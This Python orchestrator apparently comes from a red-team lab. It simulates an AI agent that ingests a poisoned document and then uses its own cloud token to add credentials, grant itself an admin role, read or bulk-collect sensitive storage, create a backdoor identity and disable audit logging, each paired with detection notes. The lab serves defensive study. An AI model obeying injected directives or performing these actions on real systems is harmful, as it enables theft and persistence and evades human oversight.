"""Attack chain orchestrator — runs the full ATLAS-to-ATT&CK pivot."""

import json
import os
from pathlib import Path

from bridgelab.auth import AgentAuth, EntraAgentAuth, MockAuth
from bridgelab.telemetry import ChainLogger
from bridgelab.tools import (
    AzureIAMTool,
    AzureMonitorTool,
    AzureStorageTool,
    CloudIAMTool,
    CloudLogTool,
    CloudStorageTool,
    MockAzureIAMTool,
    MockAzureMonitorTool,
    MockCloudIAMTool,
    MockCloudLogTool,
    MockCloudStorageTool,
    ReadDocumentTool,
)

POISON_DIR = Path(__file__).parent.parent / "infra" / "poison"

TECHNIQUE_SPECS: dict[str, dict] = {
    "additional-credentials": {
        "poison_doc_default": POISON_DIR / "malicious_document.md",
        "atlas_stage_title": "ATLAS: AI Agent Context Poisoning",
        "atlas_technique_id": "AML.T0080.001",
        "atlas_technique_name": "AI Agent Context Poisoning: Memory",
        "attack_stage_title": "ATT&CK v19: Account Manipulation (T1098.001)",
        "attack_technique_id": "T1098.001",
        "attack_technique_name": "Account Manipulation: Additional Cloud Credentials",
        "impact_stage_title": "IMPACT: Attacker gains persistent cloud access",
        "impact_event_description": "Attacker can now authenticate directly to cloud",
        "impact_summary": "Persistent attacker access via a self-issued cloud credential",
        "persistence_type": "Cloud credential — valid until manually revoked",
    },
    "additional-roles": {
        "poison_doc_default": POISON_DIR / "malicious_role_directive.md",
        "atlas_stage_title": "ATLAS: AI Agent Tool Invocation",
        "atlas_technique_id": "AML.T0053",
        "atlas_technique_name": "AI Agent Tool Invocation",
        "attack_stage_title": "ATT&CK v19: Account Manipulation (T1098.003)",
        "attack_technique_id": "T1098.003",
        "attack_technique_name": "Account Manipulation: Additional Cloud Roles",
        "impact_stage_title": "IMPACT: Attacker gains persistent cloud access",
        "impact_event_description": "Attacker-controlled identity now holds a self-granted elevated role",
        "impact_summary": "Persistent, elevated privilege via a self-granted role/policy",
        "persistence_type": "Elevated role/policy membership — valid until manually revoked",
    },
    "out-of-scope-access": {
        "poison_doc_default": POISON_DIR / "malicious_tool_output.md",
        "atlas_stage_title": "ATLAS: LLM Prompt Injection",
        "atlas_technique_id": "AML.T0051",
        "atlas_technique_name": "LLM Prompt Injection",
        "attack_stage_title": "ATT&CK v19: Use Alternate Authentication Material (T1550.001)",
        "attack_technique_id": "T1550.001",
        "attack_technique_name": "Use Alternate Authentication Material: Application Access Token",
        "impact_stage_title": "IMPACT: Agent's token reached a resource outside its declared scope",
        "impact_event_description": (
            "Attacker-steered agent reused its own valid token against a resource "
            "outside its declared scope"
        ),
        "impact_summary": "Lateral access to an out-of-scope resource via the agent's own valid token",
        "persistence_type": "None — no new credential or role; the token itself was always valid",
    },
    "data-collection": {
        "poison_doc_default": POISON_DIR / "malicious_collection_directive.md",
        "atlas_stage_title": "ATLAS: AI Agent Tool Invocation",
        "atlas_technique_id": "AML.T0053",
        "atlas_technique_name": "AI Agent Tool Invocation",
        "attack_stage_title": "ATT&CK v19: Data from Cloud Storage (T1530)",
        "attack_technique_id": "T1530",
        "attack_technique_name": "Data from Cloud Storage",
        "impact_stage_title": "IMPACT: Sensitive data bulk-collected via agent's legitimate storage identity",
        "impact_event_description": (
            "Attacker-steered agent enumerated and exfiltrated every object in a storage "
            "bucket using its own valid, legitimately-scoped identity"
        ),
        "impact_summary": (
            "Bulk data collection/exfiltration via the agent's own valid storage-reader identity"
        ),
        "persistence_type": "None — data already exfiltrated, no persistent artifact",
    },
    "create-account": {
        "poison_doc_default": POISON_DIR / "malicious_account_directive.md",
        "atlas_stage_title": "ATLAS: Publish Poisoned AI Agent Tool",
        "atlas_technique_id": "AML.T0104",
        "atlas_technique_name": "Publish Poisoned AI Agent Tool",
        "attack_stage_title": "ATT&CK v19: Create Account (T1136.003)",
        "attack_technique_id": "T1136.003",
        "attack_technique_name": "Create Account: Cloud Account",
        "impact_stage_title": "IMPACT: Attacker gains a new persistent backdoor identity",
        "impact_event_description": (
            "Attacker-steered agent created a brand-new cloud identity it controls, "
            "separate from the agent's own"
        ),
        "impact_summary": "Persistent attacker access via an agent-created backdoor cloud identity",
        "persistence_type": (
            "New cloud identity (App Registration / IAM user) — valid until manually "
            "deleted (auto-removed in this lab)"
        ),
    },
    "disable-cloud-log": {
        "poison_doc_default": POISON_DIR / "malicious_logging_directive.md",
        "atlas_stage_title": "ATLAS: AI Agent Context Poisoning",
        "atlas_technique_id": "AML.T0080.001",
        "atlas_technique_name": "AI Agent Context Poisoning: Memory",
        "attack_stage_title": "ATT&CK v19: Disable or Modify Tools (T1685.002)",
        "attack_technique_id": "T1685.002",
        "attack_technique_name": "Disable or Modify Tools: Disable or Modify Cloud Log",
        "impact_stage_title": "IMPACT: Agent impaired cloud audit logging before acting",
        "impact_event_description": (
            "Attacker-steered agent used its own legitimate admin access to disable or "
            "modify cloud audit logging, reducing visibility of its own activity"
        ),
        "impact_summary": (
            "Reduced detection visibility via the agent's own identity impairing cloud audit logs"
        ),
        "persistence_type": (
            "None — defense impairment; audit visibility reduced, no persistent identity artifact"
        ),
    },
}


class AttackChain:
    """Orchestrate the full ATLAS -> bridge -> ATT&CK -> impact chain."""

    def __init__(
        self,
        mode: str = "mock",
        identity_provider: str = "keycloak",
        cloud_target: str = "localstack",
        technique: str = "additional-credentials",
        confirm_destructive: bool = False,
        config: dict | None = None,
    ):
        if technique not in TECHNIQUE_SPECS:
            raise ValueError(f"Unknown technique: {technique}")
        self.mode = mode
        self.identity_provider = identity_provider
        self.cloud_target = cloud_target
        self.technique = technique
        self.confirm_destructive = confirm_destructive
        self.config = config or {}
        self.logger = ChainLogger()
        self._token: str | None = None

        if mode == "live":
            self.auth = self._build_auth()
            self.iam_tool = self._build_iam_tool()
        else:
            self.auth = MockAuth(client_id="bridgelab-agent")
            if cloud_target == "azure":
                if technique == "disable-cloud-log":
                    self.iam_tool = MockAzureMonitorTool()
                else:
                    self.iam_tool = MockAzureIAMTool()
            elif technique in ("out-of-scope-access", "data-collection"):
                self.iam_tool = MockCloudStorageTool()
            elif technique == "disable-cloud-log":
                self.iam_tool = MockCloudLogTool()
            else:
                self.iam_tool = MockCloudIAMTool()

        self.doc_tool = ReadDocumentTool()
        self.poison_doc = str(
            self.config.get(
                "poison_doc",
                os.environ.get("POISON_DOC", TECHNIQUE_SPECS[technique]["poison_doc_default"]),
            )
        )

    def _build_auth(self):
        """Construct the live identity-provider backend for identity_provider."""
        if self.identity_provider == "keycloak":
            return AgentAuth(
                keycloak_url=self.config.get(
                    "keycloak_url",
                    os.environ.get("KEYCLOAK_URL", "http://localhost:8080"),
                ),
                client_id=self.config.get("client_id", "bridgelab-agent"),
                client_secret=self.config.get(
                    "client_secret", "agent-secret-do-not-use-in-production"
                ),
            )
        if self.identity_provider == "entra":
            # Different techniques hit different Azure planes, each needing a
            # token scoped to that resource: data-collection uses the Storage
            # data plane; disable-cloud-log uses the ARM management plane
            # (diagnostic settings); the rest call Microsoft Graph.
            if self.technique == "data-collection":
                scope = "https://storage.azure.com/.default"
            elif self.technique == "disable-cloud-log":
                scope = "https://management.azure.com/.default"
            else:
                scope = "https://graph.microsoft.com/.default"
            return EntraAgentAuth(
                tenant_id=self.config.get("tenant_id", os.environ.get("ENTRA_TENANT_ID", "")),
                client_id=self.config.get("client_id", os.environ.get("ENTRA_CLIENT_ID", "")),
                client_secret=self.config.get(
                    "client_secret", os.environ.get("ENTRA_CLIENT_SECRET", "")
                ),
                scope=scope,
            )
        raise ValueError(f"Unknown identity_provider: {self.identity_provider}")

    def _build_iam_tool(self):
        """Construct the live cloud-target backend for cloud_target.

        Azure returns None here: AzureIAMTool must be built with the real
        bridge-stage token, which doesn't exist yet at __init__ time — it's
        built lazily in _perform_escalation() once run() has fetched it.
        """
        if self.cloud_target == "localstack":
            endpoint_url = self.config.get(
                "aws_endpoint", os.environ.get("AWS_ENDPOINT_URL", "http://localhost:4566")
            )
            if self.technique in ("out-of-scope-access", "data-collection"):
                return CloudStorageTool(endpoint_url=endpoint_url)
            if self.technique == "disable-cloud-log":
                return CloudLogTool(endpoint_url=endpoint_url)
            return CloudIAMTool(endpoint_url=endpoint_url)
        if self.cloud_target == "azure":
            return None
        raise ValueError(f"Unknown cloud_target: {self.cloud_target}")

    def _perform_escalation(self) -> dict:
        """Run the cloud-target-specific 'add persistent credential' action, log
        the ATT&CK event, and return the raw tool result for the impact stage."""
        if self.cloud_target == "azure":
            target_app_id = self.config.get(
                "target_app_id", os.environ.get("AZURE_TARGET_APP_ID", "bridgelab-backup-app")
            )
            # self.iam_tool is only pre-built for mock mode; live mode builds
            # AzureIAMTool here with the real bridge-stage token (self._token).
            iam_tool = self.iam_tool or AzureIAMTool(
                token=self._token, confirm_destructive=self.confirm_destructive
            )
            if self.mode == "live" and self.confirm_destructive:
                print(f"\n  {'!' * 60}")
                print("  DESTRUCTIVE AZURE CALL — adding a real credential to")
                print(f"  service principal {target_app_id!r} in a live tenant.")
                print(f"  {'!' * 60}\n")
            result = iam_tool.execute("add_credential", target_app_id=target_app_id)
            details = {
                "technique": "Account Manipulation: Additional Cloud Credentials",
                "tactic": "Persistence",
                "target_app_id": target_app_id,
                "key_id": result.get("key_id"),
                "dry_run": result.get("dry_run", False),
                "created_by_principal": self.auth.client_id,
                "detection": "Graph addPassword called by agent service principal outside rotation window",
                "log_source": "Microsoft Graph Audit Log / Azure AD Sign-in Log",
            }
        else:
            result = self.iam_tool.execute("create_access_key", username="backup-admin")
            details = {
                "technique": "Account Manipulation: Additional Cloud Credentials",
                "tactic": "Persistence",
                "target_user": "backup-admin",
                "access_key_id": result.get("access_key_id"),
                "created_by_principal": self.auth.client_id,
                "detection": "IAM CreateAccessKey by agent principal outside rotation window",
                "log_source": "AWS CloudTrail",
            }
        self.logger.event(
            "attack", "T1098.001", "Additional cloud credentials created by agent identity", details
        )
        return dict(result)

    def _perform_privilege_escalation(self) -> dict:
        """Run the cloud-target-specific self-role-escalation action, log the
        ATT&CK event, and return the raw tool result for the impact stage.

        Azure/Entra: the real path is always read-only (list current directory
        role assignments) — RoleManagement.ReadWrite.Directory is tenant-wide
        power, unlike Application.ReadWrite.OwnedBy, so the actual self-
        assignment is only ever simulated in mock mode; AzureIAMTool has no
        write path for this action at all, live or not. LocalStack has no such
        real-world blast radius, so the real attach happens unconditionally
        there, same as _perform_escalation's LocalStack branch.
        """
        if self.cloud_target == "azure":
            principal_id = self.config.get(
                "agent_sp_object_id",
                os.environ.get("ENTRA_AGENT_SP_OBJECT_ID", "bridgelab-agent-sp"),
            )
            iam_tool = self.iam_tool or AzureIAMTool(
                token=self._token, confirm_destructive=self.confirm_destructive
            )
            if self.mode == "live":
                if self.confirm_destructive:
                    print(
                        "\n  NOTE: --confirm-destructive has no effect here — the real "
                        "directory-role self-assignment is never performed against a live "
                        "tenant for this technique. See docs/entra-setup.md.\n"
                    )
                result = iam_tool.execute("list_role_assignments", principal_id=principal_id)
            else:
                result = iam_tool.execute("assign_role", principal_id=principal_id)
            details = {
                "technique": "Account Manipulation: Additional Cloud Roles",
                "tactic": "Privilege Escalation",
                "principal_id": principal_id,
                "dry_run": result.get("dry_run", self.mode == "live"),
                "created_by_principal": self.auth.client_id,
                "detection": (
                    "Directory role assignment where principalId == actor; "
                    "self-escalation pattern (caller == target)"
                ),
                "log_source": "Microsoft Graph Audit Log / Entra ID Audit Log",
            }
        else:
            result = self.iam_tool.execute("attach_admin_policy", username="bridgelab-agent")
            details = {
                "technique": "Account Manipulation: Additional Cloud Roles",
                "tactic": "Privilege Escalation",
                "target_user": "bridgelab-agent",
                "policy_arn": result.get("policy_arn"),
                "created_by_principal": self.auth.client_id,
                "detection": (
                    "IAM AttachUserPolicy where target user == calling principal; "
                    "self-escalation pattern (caller == target)"
                ),
                "log_source": "AWS CloudTrail",
            }
        self.logger.event(
            "attack", "T1098.003", "Agent attached an administrator role to its own identity", details
        )
        return dict(result)

    def _perform_lateral_access(self) -> dict:
        """Run the cloud-target-specific 'reuse the agent's own token against
        an out-of-scope resource' action, log the ATT&CK event, and return
        the raw tool result for the impact stage.

        No new credential or role is created here — the danger is that the
        agent's already-valid token reaches a resource outside its declared
        tool list. Azure/Entra: always read-only, reusing the same
        list_role_assignments call as _perform_privilege_escalation, pointed
        at a principal outside the agent's normal scope — there is no write
        path for this technique at all, live or not.
        """
        if self.cloud_target == "azure":
            out_of_scope_principal_id = self.config.get(
                "out_of_scope_principal_id",
                os.environ.get(
                    "ENTRA_OUT_OF_SCOPE_PRINCIPAL_ID", "bridgelab-out-of-scope-principal"
                ),
            )
            iam_tool = self.iam_tool or AzureIAMTool(
                token=self._token, confirm_destructive=self.confirm_destructive
            )
            result = iam_tool.execute(
                "list_role_assignments", principal_id=out_of_scope_principal_id
            )
            details = {
                "technique": "Use Alternate Authentication Material: Application Access Token",
                "tactic": "Lateral Movement",
                "principal_id": out_of_scope_principal_id,
                "dry_run": result.get("dry_run", True),
                "used_by_principal": self.auth.client_id,
                "detection": (
                    "Agent service principal's token used to query a principal outside "
                    "its declared tool list; token used for API not in agent's declared "
                    "tool list"
                ),
                "log_source": "Microsoft Graph Audit Log / Entra ID Sign-in Log",
            }
        else:
            result = self.iam_tool.execute(
                "read_object", bucket="bridgelab-sensitive-data", key="pii/records.json"
            )
            details = {
                "technique": "Use Alternate Authentication Material: Application Access Token",
                "tactic": "Lateral Movement",
                "bucket": result.get("bucket"),
                "key": result.get("key"),
                "used_by_principal": self.auth.client_id,
                "detection": (
                    "Agent service principal accessed a storage bucket outside its "
                    "normal scope; token used for API not in agent's declared tool list"
                ),
                "log_source": "AWS CloudTrail / S3 server access log",
            }
        self.logger.event(
            "attack",
            "T1550.001",
            "Agent used its own token to access an out-of-scope resource",
            details,
        )
        return dict(result)

    def _perform_collection(self) -> dict:
        """Run the 'enumerate and bulk-read the bucket/container' action, log
        the ATT&CK event, and return the raw tool result for the impact
        stage.

        Azure/Entra: unlike additional-roles/out-of-scope-access, this is
        never capped to a read-only proof — Storage Blob Data Reader is
        scoped to one container (not tenant-wide like
        RoleManagement.ReadWrite.Directory), and the real action already IS
        a read, so a real live list+read carries no broader-permission risk.
        """
        if self.cloud_target == "azure":
            account = self.config.get(
                "storage_account", os.environ.get("AZURE_STORAGE_ACCOUNT", "bridgelabstorage")
            )
            container = self.config.get(
                "storage_container",
                os.environ.get("AZURE_STORAGE_CONTAINER", "bridgelab-sensitive-data"),
            )
            iam_tool = self.iam_tool or AzureStorageTool(token=self._token)
            result = iam_tool.execute("list_and_collect", account=account, container=container)
            details = {
                "technique": "Data from Cloud Storage",
                "tactic": "Collection",
                "account": result.get("account"),
                "container": result.get("container"),
                "keys": result.get("keys"),
                "object_count": result.get("object_count"),
                "total_bytes": result.get("total_bytes"),
                "used_by_principal": self.auth.client_id,
                "detection": (
                    "Agent service principal enumerated and bulk-read every blob in a storage "
                    "container; container-wide List+Get pattern from a non-human identity "
                    "outside its normal single-object access pattern"
                ),
                "log_source": "Azure Storage Diagnostic Log / Entra ID Sign-in Log",
            }
        else:
            result = self.iam_tool.execute("list_and_collect", bucket="bridgelab-sensitive-data")
            details = {
                "technique": "Data from Cloud Storage",
                "tactic": "Collection",
                "bucket": result.get("bucket"),
                "keys": result.get("keys"),
                "object_count": result.get("object_count"),
                "total_bytes": result.get("total_bytes"),
                "used_by_principal": self.auth.client_id,
                "detection": (
                    "Agent service principal enumerated and bulk-read every object in a storage "
                    "bucket; bucket-wide ListBucket+GetObject pattern from a non-human identity "
                    "outside its normal single-object access pattern"
                ),
                "log_source": "AWS CloudTrail / S3 server access log",
            }
        self.logger.event(
            "attack",
            "T1530",
            "Agent enumerated and bulk-collected objects from a storage bucket using its own identity",
            details,
        )
        return dict(result)

    def _perform_account_creation(self) -> dict:
        """Create a brand-new cloud identity the attacker controls — T1136.003.

        Azure/Entra: gated behind confirm_destructive exactly like
        _perform_escalation. When confirmed, AzureIAMTool creates a real App
        Registration and immediately deletes it (auto-cleanup), so both the
        'Add application' and 'Delete application' events land in the Entra
        audit log with no persistent backdoor left in the tenant; without the
        flag it degrades to a read-only application listing. LocalStack has no
        real-world blast radius, so the new IAM user is created unconditionally.
        """
        if self.cloud_target == "azure":
            display_name = self.config.get(
                "new_app_display_name",
                os.environ.get("AZURE_NEW_APP_DISPLAY_NAME", "bridgelab-backup-agent"),
            )
            iam_tool = self.iam_tool or AzureIAMTool(
                token=self._token, confirm_destructive=self.confirm_destructive
            )
            if self.mode == "live" and self.confirm_destructive:
                print(f"\n  {'!' * 60}")
                print("  DESTRUCTIVE AZURE CALL — creating (then deleting) a real")
                print(f"  App Registration {display_name!r} in a live tenant.")
                print(f"  {'!' * 60}\n")
            result = iam_tool.execute("create_account", display_name=display_name)
            details = {
                "technique": "Create Account: Cloud Account",
                "tactic": "Persistence",
                "new_app_display_name": display_name,
                "app_id": result.get("app_id"),
                "app_object_id": result.get("app_object_id"),
                "cleaned_up": result.get("cleaned_up", False),
                "dry_run": result.get("dry_run", False),
                "created_by_principal": self.auth.client_id,
                "detection": (
                    "Graph 'Add application' by agent service principal; new App "
                    "Registration created by a non-human identity outside the "
                    "provisioning workflow"
                ),
                "log_source": "Microsoft Graph Audit Log / Entra ID Audit Log",
            }
        else:
            result = self.iam_tool.execute("create_user", username="bridgelab-backup-agent")
            details = {
                "technique": "Create Account: Cloud Account",
                "tactic": "Persistence",
                "new_username": result.get("username"),
                "user_id": result.get("user_id"),
                "created_by_principal": self.auth.client_id,
                "detection": (
                    "IAM CreateUser by agent principal; account creation by non-human "
                    "identity outside the provisioning workflow"
                ),
                "log_source": "AWS CloudTrail",
            }
        self.logger.event(
            "attack", "T1136.003", "Agent created a new backdoor cloud identity", details
        )
        return dict(result)

    def _perform_log_disable(self) -> dict:
        """Disable or modify cloud audit logging via the agent's identity — T1685.002.

        LocalStack: reduce a CloudWatch Logs audit group's retention to the
        1-day minimum (CloudTrail is Pro-only on this LocalStack edition, so
        CloudWatch Logs is the community-supported stand-in). No blast radius in the sandbox, so
        the modify happens unconditionally, mirroring the LocalStack branches
        of the other techniques.

        Azure/Entra: gated behind confirm_destructive exactly like
        _perform_account_creation. When confirmed, AzureMonitorTool captures
        the target diagnostic setting, deletes it (the disable), then restores
        it — both the delete and re-create land in the Azure Activity Log with
        audit logging left re-enabled; without the flag it degrades to a
        read-only diagnostic-settings listing. The ARM management-plane token
        scope is selected in _build_auth.
        """
        if self.cloud_target == "azure":
            resource_id = self.config.get(
                "azure_log_resource_id",
                os.environ.get("AZURE_LOG_RESOURCE_ID", "bridgelab-audited-resource"),
            )
            setting_name = self.config.get(
                "azure_diagnostic_setting_name",
                os.environ.get("AZURE_DIAGNOSTIC_SETTING_NAME", "bridgelab-audit-diagnostics"),
            )
            monitor_tool = self.iam_tool or AzureMonitorTool(
                token=self._token, confirm_destructive=self.confirm_destructive
            )
            if self.mode == "live" and self.confirm_destructive:
                print(f"\n  {'!' * 60}")
                print("  DESTRUCTIVE AZURE CALL — deleting (then restoring) the")
                print(f"  diagnostic setting {setting_name!r} in a live tenant.")
                print(f"  {'!' * 60}\n")
            result = monitor_tool.execute(
                "disable_log", resource_id=resource_id, setting_name=setting_name
            )
            details = {
                "technique": "Disable or Modify Tools: Disable or Modify Cloud Log",
                "tactic": "Defense Impairment",
                "resource_id": resource_id,
                "setting_name": result.get("setting_name"),
                "restored": result.get("restored"),
                "dry_run": result.get("dry_run", False),
                "modified_by_principal": self.auth.client_id,
                "detection": (
                    "Azure Activity Log 'Delete diagnostic setting' by the agent service "
                    "principal; diagnostic-setting removal outside the logging-config "
                    "change workflow"
                ),
                "log_source": "Azure Activity Log / Entra ID Sign-in Log",
            }
            self.logger.event(
                "attack",
                "T1685.002",
                "Agent impaired cloud audit logging using its own identity",
                details,
            )
            return dict(result)
        log_group_name = self.config.get(
            "audit_log_group", os.environ.get("AWS_AUDIT_LOG_GROUP", "bridgelab-audit")
        )
        result = self.iam_tool.execute("disable_log", log_group_name=log_group_name)
        details = {
            "technique": "Disable or Modify Tools: Disable or Modify Cloud Log",
            "tactic": "Defense Impairment",
            "log_group_name": result.get("log_group_name"),
            "retention_days": result.get("retention_days"),
            "modified_by_principal": self.auth.client_id,
            "detection": (
                "CloudWatch Logs PutRetentionPolicy reducing an audit log group to the "
                "minimum retention, by the agent principal, outside the logging-config "
                "change workflow"
            ),
            "log_source": "AWS CloudTrail (management events)",
        }
        self.logger.event(
            "attack",
            "T1685.002",
            "Agent impaired cloud audit logging using its own identity",
            details,
        )
        return dict(result)

    def run(self) -> dict:
        spec = TECHNIQUE_SPECS[self.technique]
        print(f"\n{'#' * 64}")
        print(f"  BridgeLab Attack Chain — mode: {self.mode}")
        print(f"  Chain ID: {self.logger.chain_id}")
        print(f"{'#' * 64}")

        # ── Stage 1: ATLAS — Agent ingests poisoned content ──
        self.logger.stage("atlas", spec["atlas_stage_title"])
        doc_content = self.doc_tool.execute(self.poison_doc)
        self.logger.event(
            "atlas",
            spec["atlas_technique_id"],
            "Agent ingested poisoned document",
            {
                "technique": spec["atlas_technique_name"],
                "document": self.poison_doc,
                "content_length": len(doc_content),
                "poison_type": "Embedded directive in HTML comment",
            },
        )

        # ── Stage 2: THE BRIDGE — Agent identity becomes the weapon ──
        self.logger.stage("bridge", "BRIDGE: Agent's identity becomes the attack vector")
        token = self.auth.get_token()
        self._token = token
        self.logger.event(
            "bridge",
            "BRIDGE-CONDITION",
            "Agent decides to act on poisoned directive using its own credential",
            {
                "client_id": self.auth.client_id,
                "token_type": "OAuth2 client_credentials",
                "token_preview": token[:24] + "...",
                "reasoning": "Agent interprets embedded directive as pre-approved compliance operation",
                "key_insight": "No credential theft — the agent uses its OWN legitimate token",
            },
        )

        # ── Stage 3: ATT&CK — Identity-based attack ──
        self.logger.stage("attack", spec["attack_stage_title"])
        if self.technique == "additional-roles":
            result = self._perform_privilege_escalation()
        elif self.technique == "out-of-scope-access":
            result = self._perform_lateral_access()
        elif self.technique == "data-collection":
            result = self._perform_collection()
        elif self.technique == "create-account":
            result = self._perform_account_creation()
        elif self.technique == "disable-cloud-log":
            result = self._perform_log_disable()
        else:
            result = self._perform_escalation()

        # ── Stage 4: Impact — Persistent attacker access ──
        self.logger.stage("impact", spec["impact_stage_title"])
        self.logger.event(
            "impact",
            f"{spec['attack_technique_id']}-IMPACT",
            spec["impact_event_description"],
            {
                **result,
                "persistence_type": spec["persistence_type"],
                "attacker_capability": f"Direct {self.cloud_target} API access without agent involvement",
                "blast_radius": "Full scope of the compromised principal's permissions",
            },
        )

        print(f"\n{'#' * 64}")
        print(f"  Chain complete — {len(self.logger.get_events())} events recorded")
        print(f"{'#' * 64}\n")

        return {
            "success": True,
            "mode": self.mode,
            "chain_id": self.logger.chain_id,
            "events": self.logger.get_events(),
            "summary": {
                "identity_provider": self.identity_provider,
                "cloud_target": self.cloud_target,
                "technique": self.technique,
                "atlas_technique": f"{spec['atlas_technique_id']} — {spec['atlas_technique_name']}",
                "bridge_condition": "Agent uses own OAuth token to execute poisoned directive",
                "attack_technique": f"{spec['attack_technique_id']} — {spec['attack_technique_name']}",
                "impact": spec["impact_summary"],
            },
        }


def _load_dotenv(path: str = ".env") -> None:
    """Best-effort .env loader for the CLI only — no external dependency, and
    never overrides a variable already set in the real environment."""
    env_path = Path(path)
    if not env_path.exists():
        return
    for line in env_path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        key = key.strip()
        if key and key not in os.environ:
            os.environ[key] = value.strip()


def main():
    import argparse

    _load_dotenv()

    parser = argparse.ArgumentParser(description="Run BridgeLab attack chain")
    parser.add_argument("--mode", choices=["mock", "live"], default="mock", help="Run mode")
    parser.add_argument(
        "--idp",
        choices=["keycloak", "entra"],
        default="keycloak",
        dest="identity_provider",
        help="Identity provider for the bridge stage (default: keycloak)",
    )
    parser.add_argument(
        "--cloud",
        choices=["localstack", "azure"],
        default="localstack",
        dest="cloud_target",
        help="Cloud target for the escalation stage (default: localstack)",
    )
    parser.add_argument(
        "--technique",
        choices=list(TECHNIQUE_SPECS),
        default="additional-credentials",
        help=(
            "Which ATLAS->ATT&CK pivot to run (default: additional-credentials). "
            "additional-roles is T1098.003 self-privilege-escalation; against "
            "--cloud azure it is always read-only, regardless of --confirm-destructive. "
            "out-of-scope-access is T1550.001 token reuse against an out-of-scope "
            "resource; against --cloud azure it is always read-only. "
            "data-collection is T1530 bulk bucket/container enumeration and collection; "
            "unlike the other two, it is always fully live on both stacks, never "
            "read-only-capped, since its permission (S3 read / Storage Blob Data "
            "Reader) is narrowly scoped and the technique's real action is a read. "
            "create-account is T1136.003, the agent minting a brand-new backdoor "
            "identity (Azure App Registration / IAM user); against --cloud azure it "
            "is gated behind --confirm-destructive and, when confirmed, creates the "
            "App Registration then immediately deletes it (auto-cleanup), so nothing "
            "persists in the live tenant."
        ),
    )
    parser.add_argument(
        "--confirm-destructive",
        action="store_true",
        help=(
            "Actually perform the destructive action for techniques/targets that "
            "support it (Azure add-credential and create-account, LocalStack "
            "techniques). Without this, --cloud azure always runs as a safe, "
            "read-only dry run."
        ),
    )
    parser.add_argument("--output", help="Write chain output JSON to this path")
    args = parser.parse_args()

    chain = AttackChain(
        mode=args.mode,
        identity_provider=args.identity_provider,
        cloud_target=args.cloud_target,
        technique=args.technique,
        confirm_destructive=args.confirm_destructive,
    )
    result = chain.run()

    if args.output:
        outpath = Path(args.output)
        outpath.parent.mkdir(parents=True, exist_ok=True)
        outpath.write_text(json.dumps(result, indent=2) + "\n")
        print(f"Chain output written to {outpath}")


if __name__ == "__main__":
    main()
